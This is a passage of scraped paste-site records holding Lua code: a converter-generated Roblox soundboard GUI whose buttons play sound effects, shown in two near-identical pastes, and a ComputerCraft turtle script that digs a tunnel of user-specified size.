RobloxOofSound.Size = UDim2.new(0, 200, 0, 50)
RobloxOofSound.Font = Enum.Font.Gotham
RobloxOofSound.Text = ""Roblox Oof Sound""
RobloxOofSound.TextColor3 = Color3.fromRGB(255, 255, 255)
RobloxOofSound.TextSize = 14.000

UICorner_2.Parent = RobloxOofSound

Gunshot.Name = ""Gunshot""
Gunshot.Parent = Frame
Gunshot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderSizePixel = 0
Gunshot.Position = UDim2.new(0.0286831819, 0, 9.95238018, 0)
Gunshot.Size = UDim2.new(0, 200, 0, 50)
Gunshot.Font = Enum.Font.Gotham
Gunshot.Text = ""Gun Shot""
Gunshot.TextColor3 = Color3.fromRGB(255, 255, 255)
Gunshot.TextSize = 14.000

UICorner_3.Parent = Gunshot

Hitmarker.Name = ""Hitmarker""
Hitmarker.Parent = Frame
Hitmarker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderSizePixel = 0
Hitmarker.Position = UDim2.new(0.0286831819, 0, 12.4190474, 0)
Hitmarker.Size = UDim2.new(0, 200, 0, 50)
Hitmarker.Font = Enum.Font.Gotham
Hitmarker.Text = ""Hit Marker""
Hitmarker.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitmarker.TextSize = 14.000

UICorner_4.Parent = Hitmarker

Fart.Name = ""Fart""
Fart.Parent = Frame
Fart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderSizePixel = 0
Fart.Position = UDim2.new(0.0286831819, 0, 14.8523808, 0)
Fart.Size = UDim2.new(0, 200, 0, 50)
Fart.Font = Enum.Font.Gotham
Fart.Text = ""Fart""
Fart.TextColor3 = Color3.fromRGB(255, 255, 255)
Fart.TextSize = 14.000

UICorner_5.Parent = Fart

-- Scripts:

local function KRNX_fake_script() -- Frame.GUIDrag 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService(""UserInputService"")
	local runService = (game:GetService(""RunService""));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(KRNX_fake_script)()
local function PVXCXHU_fake_script() -- Burger.Playsound 
	local script = Instance.new('LocalScript', Burger)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://7588343260"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
end
coroutine.wrap(PVXCXHU_fake_script)()
local function MOZLKZ_fake_script() -- RobloxOofSound.Playsound 
	local script = Instance.new('LocalScript', RobloxOofSound)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://709854053"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(MOZLKZ_fake_script)()
local function GUTP_fake_script() -- Gunshot.Playsound 
	local script = Instance.new('LocalScript', Gunshot)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://1905367471"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(GUTP_fake_script)()
local function QQWITL_fake_script() -- Hitmarker.Playsound 
	local script = Instance.new('LocalScript', Hitmarker)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://160432334"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(QQWITL_fake_script)()
local function YYVTA_fake_script() -- Fart.Playsound 
	local script = Instance.new('LocalScript', Fart)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://4809574295"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(YYVTA_fake_script)()
"
6XHuRqmk,digtunnel,labrecquev,Lua,Sunday 18th of February 2024 01:39:40 PM CDT,"-- Function to dig a tunnel with specified dimensions
local function digTunnel(width, height, distance)
    for _ = 1, width do
        for _ = 1, height do
            -- Dig forward by the specified distance
            for _ = 1, distance do
                turtle.dig()
                turtle.forward()
            end
            -- Return to the starting position
            for _ = 1, distance do
                turtle.back()
            end
            -- Move up for the next layer
            if height > 1 then
                turtle.up()
            end
        end
        -- Return to the starting position
        turtle.turnRight()
        turtle.turnRight()
        for _ = 1, height - 1 do
            turtle.down()
        end
        for _ = 1, distance do
            turtle.forward()
        end
        turtle.turnRight()
    end
    print(""Tunnel dug successfully!"")
end

-- Main function
local function main()
    print(""Enter the width of the tunnel:"")
    local width = tonumber(io.read())
    print(""Enter the height of the tunnel:"")
    local height = tonumber(io.read())
    print(""Enter the distance to dig:"")
    local distance = tonumber(io.read())

    if width and height and distance and width > 0 and height > 0 and distance > 0 then
        digTunnel(width, height, distance)
    else
        print(""Invalid input. Please enter positive numbers for width, height, and distance."")
    end
end

-- Run the main function
main()
"
BSNWgADQ,fixed_convert,Clickady,Lua,Sunday 18th of February 2024 01:38:56 PM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local Frame_2 = Instance.new(""Frame"")
local Title = Instance.new(""TextLabel"")
local Burger = Instance.new(""TextButton"")
local UICorner = Instance.new(""UICorner"")
local Title_2 = Instance.new(""TextLabel"")
local RobloxOofSound = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Gunshot = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local Hitmarker = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local Fart = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.581352651, 0, 0.190701976, 0)
Frame.Size = UDim2.new(0, 767, 0, 30)

Frame_2.Parent = Frame
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.500255108, 0, 10.0659294, 0)
Frame_2.Size = UDim2.new(0, 766, 0, 544)

Title.Name = ""Title""
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0299867243, 0, 0.100000001, 0)
Title.Size = UDim2.new(0, 720, 0, 27)
Title.Font = Enum.Font.Gotham
Title.Text = ""Voice Mod""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000

Burger.Name = ""Burger""
Burger.Parent = Frame
Burger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderSizePixel = 0
Burger.Position = UDim2.new(0.0286831819, 0, 4.51904726, 0)
Burger.Size = UDim2.new(0, 200, 0, 50)
Burger.Font = Enum.Font.Gotham
Burger.Text = ""Burger King""
Burger.TextColor3 = Color3.fromRGB(255, 255, 255)
Burger.TextSize = 14.000

UICorner.Parent = Burger

Title_2.Name = ""Title""
Title_2.Parent = Frame
Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0299867243, 0, 2.33333325, 0)
Title_2.Size = UDim2.new(0, 720, 0, 27)
Title_2.Font = Enum.Font.Gotham
Title_2.Text = ""Sound""
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 14.000

RobloxOofSound.Name = ""Roblox Oof Sound""
RobloxOofSound.Parent = Frame
RobloxOofSound.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderSizePixel = 0
RobloxOofSound.Position = UDim2.new(0.0286831819, 0, 7.21904707, 0)
RobloxOofSound.Size = UDim2.new(0, 200, 0, 50)
RobloxOofSound.Font = Enum.Font.Gotham
RobloxOofSound.Text = ""Roblox Oof Sound""
RobloxOofSound.TextColor3 = Color3.fromRGB(255, 255, 255)
RobloxOofSound.TextSize = 14.000

UICorner_2.Parent = RobloxOofSound

Gunshot.Name = ""Gunshot""
Gunshot.Parent = Frame
Gunshot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderSizePixel = 0
Gunshot.Position = UDim2.new(0.0286831819, 0, 9.95238018, 0)
Gunshot.Size = UDim2.new(0, 200, 0, 50)
Gunshot.Font = Enum.Font.Gotham
Gunshot.Text = ""Gun Shot""
Gunshot.TextColor3 = Color3.fromRGB(255, 255, 255)
Gunshot.TextSize = 14.000

UICorner_3.Parent = Gunshot

Hitmarker.Name = ""Hitmarker""
Hitmarker.Parent = Frame
Hitmarker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderSizePixel = 0
Hitmarker.Position = UDim2.new(0.0286831819, 0, 12.4190474, 0)
Hitmarker.Size = UDim2.new(0, 200, 0, 50)
Hitmarker.Font = Enum.Font.Gotham
Hitmarker.Text = ""Hit Marker""
Hitmarker.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitmarker.TextSize = 14.000

UICorner_4.Parent = Hitmarker

Fart.Name = ""Fart""
Fart.Parent = Frame
Fart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderSizePixel = 0
Fart.Position = UDim2.new(0.0286831819, 0, 14.8523808, 0)
Fart.Size = UDim2.new(0, 200, 0, 50)
Fart.Font = Enum.Font.Gotham
Fart.Text = ""Fart""
Fart.TextColor3 = Color3.fromRGB(255, 255, 255)
Fart.TextSize = 14.000

UICorner_5.Parent = Fart

-- Scripts:

local function KRNX_fake_script() -- Frame.GUIDrag 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService(""UserInputService"")
	local runService = (game:GetService(""RunService""));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(KRNX_fake_script)()
local function PVXCXHU_fake_script() -- Burger.Playsound 
	local script = Instance.new('LocalScript', Burger)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://7588343260"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
end
coroutine.wrap(PVXCXHU_fake_script)()
local function MOZLKZ_fake_script() -- RobloxOofSound.Playsound 
	local script = Instance.new('LocalScript', RobloxOofSound)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://709854053"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(MOZLKZ_fake_script)()
local function GUTP_fake_script() -- Gunshot.Playsound 
	local script = Instance.new('LocalScript', Gunshot)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://1905367471"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(GUTP_fake_script)()
local function QQWITL_fake_script() -- Hitmarker.Playsound 
	local script = Instance.new('LocalScript', Hitmarker)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://160432334"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(QQWITL_fake_script)()
local function YYVTA_fake_script() -- Fart.Playsound 
	local script = Instance.new('LocalScript', Fart)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://4809574295"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(YYVTA_fake_script)()
"
5At3UZU7,convert,Clickady,Lua,Sunday 18th of February 2024 01:35:22 PM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local Frame_2 = Instance.new(""Frame"")
local Title = Instance.new(""TextLabel"")
local Burger = Instance.new(""TextButton"")
local UICorner = Instance.new(""UICorner"")
local Title_2 = Instance.new(""TextLabel"")
local RobloxOofSound = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Gunshot = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local Hitmarker = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local Fart = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.581352651, 0, 0.190701976, 0)
Frame.Size = UDim2.new(0, 767, 0, 30)

Frame_2.Parent = Frame
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.500255108, 0, 10.0659294, 0)
Frame_2.Size = UDim2.new(0, 766, 0, 544)

Title.Name = ""Title""
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0299867243, 0, 0.100000001, 0)
Title.Size = UDim2.new(0, 720, 0, 27)
Title.Font = Enum.Font.Gotham
Title.Text = ""Voice Mod""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000

Burger.Name = ""Burger""
Burger.Parent = Frame
Burger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderSizePixel = 0
Burger.Position = UDim2.new(0.0286831819, 0, 4.51904726, 0)
Burger.Size = UDim2.new(0, 200, 0, 50)
Burger.Font = Enum.Font.Gotham
Burger.Text = ""Burger King""
Burger.TextColor3 = Color3.fromRGB(255, 255, 255)
Burger.TextSize = 14.000

UICorner.Parent = Burger

Title_2.Name = ""Title""
Title_2.Parent = Frame
Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0299867243, 0, 2.33333325, 0)
Title_2.Size = UDim2.new(0, 720, 0, 27)
Title_2.Font = Enum.Font.Gotham
Title_2.Text = ""Sound""
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 14.000

RobloxOofSound.Name = ""Roblox Oof Sound""
RobloxOofSound.Parent = Frame
RobloxOofSound.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderSizePixel = 0
RobloxOofSound.Position = UDim2.new(0.0286831819, 0, 7.21904707, 0)
RobloxOofSound.Size = UDim2.new(0, 200, 0, 50)
RobloxOofSound.Font = Enum.Font.Gotham
RobloxOofSound.Text = ""Roblox Oof Sound""
RobloxOofSound.TextColor3 = Color3.fromRGB(255, 255, 255)
RobloxOofSound.TextSize = 14.000

UICorner_2.Parent = RobloxOofSound

Gunshot.Name = ""Gunshot""
Gunshot.Parent = Frame
Gunshot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderColor3 = Color3.fromRGB(0, 0, 0)
Gunshot.BorderSizePixel = 0
Gunshot.Position = UDim2.new(0.0286831819, 0, 9.95238018, 0)
Gunshot.Size = UDim2.new(0, 200, 0, 50)
Gunshot.Font = Enum.Font.Gotham
Gunshot.Text = ""Gun Shot""
Gunshot.TextColor3 = Color3.fromRGB(255, 255, 255)
Gunshot.TextSize = 14.000

UICorner_3.Parent = Gunshot

Hitmarker.Name = ""Hitmarker""
Hitmarker.Parent = Frame
Hitmarker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hitmarker.BorderSizePixel = 0
Hitmarker.Position = UDim2.new(0.0286831819, 0, 12.4190474, 0)
Hitmarker.Size = UDim2.new(0, 200, 0, 50)
Hitmarker.Font = Enum.Font.Gotham
Hitmarker.Text = ""Hit Marker""
Hitmarker.TextColor3 = Color3.fromRGB(255, 255, 255)
Hitmarker.TextSize = 14.000

UICorner_4.Parent = Hitmarker

Fart.Name = ""Fart""
Fart.Parent = Frame
Fart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fart.BorderSizePixel = 0
Fart.Position = UDim2.new(0.0286831819, 0, 14.8523808, 0)
Fart.Size = UDim2.new(0, 200, 0, 50)
Fart.Font = Enum.Font.Gotham
Fart.Text = ""Fart""
Fart.TextColor3 = Color3.fromRGB(255, 255, 255)
Fart.TextSize = 14.000

UICorner_5.Parent = Fart

-- Scripts:

local function KRNX_fake_script() -- Frame.GUIDrag 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService(""UserInputService"")
	local runService = (game:GetService(""RunService""));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(KRNX_fake_script)()
local function PVXCXHU_fake_script() -- Burger.Playsound 
	local script = Instance.new('LocalScript', Burger)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://7588343260"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
end
coroutine.wrap(PVXCXHU_fake_script)()
local function MOZLKZ_fake_script() -- RobloxOofSound.Playsound 
	local script = Instance.new('LocalScript', RobloxOofSound)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://709854053"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(MOZLKZ_fake_script)()
local function GUTP_fake_script() -- Gunshot.Playsound 
	local script = Instance.new('LocalScript', Gunshot)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://1905367471"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(GUTP_fake_script)()
local function QQWITL_fake_script() -- Hitmarker.Playsound 
	local script = Instance.new('LocalScript', Hitmarker)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
